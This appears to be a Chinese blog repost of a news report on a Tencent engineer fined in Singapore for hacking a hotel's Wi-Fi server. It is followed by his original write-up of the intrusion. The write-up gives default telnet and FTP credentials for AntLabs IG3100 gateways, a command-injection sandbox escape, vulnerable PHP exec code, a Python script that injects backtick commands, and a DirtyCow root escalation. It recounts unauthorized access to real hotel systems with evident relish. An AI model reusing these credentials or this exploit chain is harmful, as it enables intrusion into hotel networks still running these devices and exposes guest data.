---
layout: post
title: 腾讯 23 岁安全工程师因黑入新加坡一酒店 Wi-Fi，或判狱三年 | 转
category: software
tags: security tencent hack
---
![](https://cdn.kelu.org/blog/tags/data.jpg)

一位中国公民在新加坡出席一次网络安全会议期间，决定黑入他下榻酒店的WiFi。

![img](https://cdn.kelu.org/blog/2018/09/1.jpg)

腾讯的23岁安全工程师郑杜涛（音译：Zheng Dutao）很想找出飞龙酒店（Fragrance Hotel）一家分店的WiFi服务器有没有安全漏洞，结果吃上了官司，真是好奇心害死猫。

郑某成功地黑入了这台服务器，并在一篇名为“钻新加坡酒店的空子”的帖子中撰文介绍了始末，他还公布了酒店管理员使用的服务器密码。结果这篇博文引起了新加坡网络安全局（CSA）的注意。

周一（9月24日），郑某因此违法行为在新加坡国家法院被罚5000美元。他对这一项罪名供认不讳：有意披露密码，未经授权擅自访问属于飞龙酒店的数据。法院在对他判决时考虑到了一起类似的罪状。

郑某上个月抵达新加坡参加“夺旗”（Capture the Flag）比赛，这项比赛是在洲际酒店举行的网络安全会议上举办的。参赛的安全专家们各自展示黑客攻击和反黑客能力。

郑某在8月27日入住了位于武吉士的飞龙酒店。一天后，他很好奇，想知道这家酒店的WiFi服务器有没有可能存在安全漏洞。通过谷歌，他成功地搜索到了这家酒店WiFi系统的默认用户ID和密码。

郑某连接到酒店的WiFi网关后，在接下来的三天内执行脚本、解密文件和破解密码，然后闯入了酒店WiFi服务器的数据库。

酒店使用的这款服务器存在一个安全漏洞，郑某钻了该漏洞的空子，最终闯入了服务器。他还试图访问飞龙酒店小印度分店的WiFi服务器，但结果失败了。

郑某在其个人博客上记述了他的攻击步骤。他在博文中公布了飞龙酒店WiFi服务器的管理员密码，还在WhatsApp群聊中共享了那篇博文的URL链接。

助理检察官蒂亚盖什•苏库马兰（Thiagesh Sukumaran）说：“郑某知道，披露这些访问代码后，飞龙酒店WiFi服务器中的安全漏洞很可能会被其他人用于非法目的，有可能给这家连锁酒店造成损失。”

检方表示，自2014年以来，郑某一直在撰写关于服务器漏洞的博客。这是他第一次发文介绍他自己发现的漏洞。

新加坡网络安全局无意中看到了他的这篇博客，立即提醒飞龙酒店的管理层。郑某接到要求后撤下了那篇博文。飞龙酒店IT副总裁于9月1日向警方提交了一份关于这起黑客行为的报告。

检方要求罚款5000美元，指出郑某似乎出于好奇而犯了罪，没有造成“实际的危害”。但助理检察官特别指出，那篇博文在不止一个论坛上共享了。

助理检察官：“作为一名安全专业人士，郑某应该知道，如果在博客上公布管理员密码，不法分子利用密码搞破坏的可能性很大。”

据检方声称，由于其他酒店使用同样款式的服务器，郑某的行为可能导致其他酒店成为网络攻击的受害者，黑客可以获取酒店客人的信息。

助理检查官补充道，这次判罚有助于阻止外国人在未经授权的情况下擅自访问新加坡系统。

郑某律师阿南•纳拉钱德兰（Anand Nalachandran）指出，虽然郑某的行为导致安全风险加大，但是并没有对这家酒店造成实际损害。由于郑某已经被拘留了几天，该律师要求罚款不超过5000美元。

至于在未经授权的情况下披露密码这起罪行，郑某可能因此被判入狱三年，最高罚款10000美元。







以下是他的博文：Exploit Singapore Hotels: ezxcess.antlabs.com

链接：https://ricterz.me/posts/Exploit%20Singapore%20Hotels%3A%20ezxcess.antlabs.com（原文已删除）

作者：RicterZ

这几天在新加坡参加 HITB，比起各类料理，更让我感兴趣的是它的酒店 WiFi。去了三家酒店，WiFi 用的都是统一套认证系统，是 AntLabs 的 IG3100 的设备。连接到 WiFi 后会弹出一个地址为 ezxcess.antlabs.com 的认证页面：



![img](https://cdn.kelu.org/blog/2018/09/1.jpg)

这个地址一般来说都是解析到 traceroute 第二跳的 IP 段的最后一位地址为 2 的主机上，比如 traceroute 的结果为 10.10.1.1，那么会解析到 10.10.1.2。 秉持着我到一个酒店日一个的精神，我对于这套系统进行了一个深入的测试，最后通过串联了 4 个漏洞拿到系统的 root 权限。

 

## 1. Backdoor Accounts

通过 Google，我找到了这个系统测两个默认口令。一个是 telnet 的帐号，帐号密码为 console / admin，另外一个是 ftp 的帐号，帐号密码为 ftponly / antlabs。很幸运，遇到的大部分酒店这两个帐号都没有禁用。

登录进去后，发现帐号在一个受限的 shell 下，看了看 shell 自带的命令，和 Linux 自带的一些命令差不多，甚至可以用一些命令查看到沙盒之外的信息，比如 ps -ef：

![img](https://cdn.kelu.org/blog/2018/09/2.jpg)



利用 netstat -l 发现这个系统存在一个 MySQL，但是仅监听在 127.0.0.1。同时还发现了 6000 端口是一个 SSH 服务端口。

![img](https://cdn.kelu.org/blog/2018/09/3.jpg)



利用 SSH，我可以建立一个端口转发，将仅监听在 127.0.0.1 的 3306 端口转发到我的 MacBook 上，然后进行连接操作。

![img](https://cdn.kelu.org/blog/2018/09/4.jpg)

看了看，爆了个 ERROR 2027 (HY000): Malformed packet 的错误，nc 上去看了一下，发现这个服务器的 MySQL 是 MySQL 4.1.2，我真的没见过这么古老的 MySQL 了。虽然我命令行连接不了，但是我还有 Navicat。用 Navicat 连接果然可以，但是问题来了，我不知道 MySQL 的密码是什么。

 

## 2. Sandbox Escape

刚才说到，telnet / ssh 连接进去后是在一个受限的 shell 里，那么作为黑客的一个特点就是看到沙盒就手痒。怎么逃逸沙盒，这个需要看 shell 提供了什么功能了。运行 help 看看：

![img](https://cdn.kelu.org/blog/2018/09/5.jpg)

经过一番思考，我发现，这个 shell 除了一些 Linux 的系统命令外，还有一些看起来不是 Linux 自带的命令，比如 sshtun、usage_log、vlandump 等等。这些命令我猜测是一些脚本或者二进制文件写的，来方便管理员进行一些操作。那么既然是开发人员编写的，那么就有可能有漏洞，特别是命令注入漏洞。尝试了几次之后，我成功利用了 vlandump 逃逸了沙盒：

![img](https://cdn.kelu.org/blog/2018/09/6.jpg)

沙盒是逃逸了，但是我还是绝望的发现，我被 chroot 了。chroot 我是绕不过去了，只能翻翻配置文件来寻找乐子。然后我惊喜地在 /etc 目录发现了 MySQL 的密码：

![img](https://cdn.kelu.org/blog/2018/09/7.jpg)

那么有了密码，又能访问端口，我们就可以连接 MySQL 登录数据库了。

 

## 3. File Read

在数据库找到了管理员的帐号密码，成功登录。接下来就是拿 shell 的时候了，那么需要对这个系统做个代码审计。

![img](https://cdn.kelu.org/blog/2018/09/8.jpg)

MySQL root 用户的好处就是可以读文件，但是我发现我读 /etc/httpd/conf.d/httpd.conf 居然显示没有权限，又猜不到 Web 的目录，场面一度十分尴尬。

峰回路转，我在 shell 内 ps -ef 的时候发现了一个奇怪的东西：

![img](https://cdn.kelu.org/blog/2018/09/9.jpg)

tcpserver 命令在 1001 启动了个端口，转交给 PHP 来处理。这个东西看起来好搞，利用 load_file 读取后，发现是用 IonCube 加密过的，网上随便找了个平台解了个密，得到代码：

![img](https://cdn.kelu.org/blog/2018/09/10.jpg)

### 4. Limited RCE

读了读代码，发现程序存在一个 RCE。

```
function logSyslog($msg)
{
    global $ip;
    global $buffer;
    $msg = trim($msg);

    if ($msg != '') {
        exec('/usr/bin/logger -p lpr.info -t Acc_Printer -- "Printer ' . $ip . ' ' . $buffer . ' ' . $msg . '"', $out, $ret);

        if ($ret == 0) {
            return TRUE;
        }
    }

    return FALSE;
}
```

这里的 msg 带入到 exec 中，并且直接双引号包裹。那么可以直接用反引号来执行命令。通读了一遍代码后，我发现除了 MySQL 查询语句居然没有其他可控的点。代码如下：

```
function generateAccount($buffer)
{
    global $ip;
    global $print_previous;
    global $timeformat;
    global $dateformat;
    global $transactionNumberDigit;
    global $printer_path;
    global $db;
    $copy_label = '';

    if ($buffer != $print_previous) {
        $query = 'SELECT * FROM ant_services.Acc_Printer_Button JOIN ant_services.Acc_Printer ON Acc_Printer_Button.printer_id=Acc_Printer.printer_id  WHERE button_code='' . mysql_real_escape_string($buffer) . '' AND printer_ip='' . mysql_real_escape_string($ip) . ''';
        $rsbutton = $db->query($query);

        if (!($button = $rsbutton->fetch())) {
            logSyslog('failed to read button configuration from database. QUERY = ' . $query);
            return FALSE;
        }
```

往上追溯一下调用这个函数的地方，我发现了更绝望的事情：

```
if (trim($buffer) == '(') {
    $buffer .= fread(STDIN, 14);

    if (!strstr($print_previous, $buffer)) {
        generateAccount($buffer);
    }
```

我们只有 14 个字节的可控点，去掉首尾的反引号后还有 12 位。这太他妈 CTF 了吧。

另外还有一个限制：

```
while (true) {
    unset($printer_details);
    clearstatcache();

    if (!($res = $db->query('SELECT * FROM ant_services.Acc_Printer WHERE printer_ip='' . mysql_real_escape_string($ip) . '' AND status='enable''))) {
        logSyslog('failed to query database to get printer details');
        exit(1);
    }

    if ($res->rowCount() == '0') {
        logSyslog('is not found in registered printer list database ');
        exit(1);
    }
```

我想执行命令的话，需要是在 ant_services.Acc_Printer 能查到我的 IP 的，不过对于拥有数据库权限的我们来说，不是什么大问题。

写了个脚本方便执行：

```
import zio, sys

io = zio.zio(('192.168.10.2', 1001))
io.write('(`%s`)' % sys.argv[1])
```

不知道大家还记得之前提过有一个 FTP 的事情吗？我发现执行命令的结果会写在 FTP 下面的 log/acc/acc.log，这也算是意外之喜了。

![img](https://cdn.kelu.org/blog/2018/09/11.jpg)

## 5. Unlimited RCE

12 个字节怎么想怎么难受，但是想了想，我们有 MySQL，能写文件。如果把要执行的命令写到 /tmp 目录下，接着利用 bash /tmp/a 执行，只需要 11 个字节，那么就非常顺利的将受限的命令执行转化为任意命令执行了。

![img](https://cdn.kelu.org/blog/2018/09/12.jpg)

## 6. DirtyCows

没啥好说的了，这个 CentOS 4 的版本，随便提权啦。

![img](https://cdn.kelu.org/blog/2018/09/13.jpg)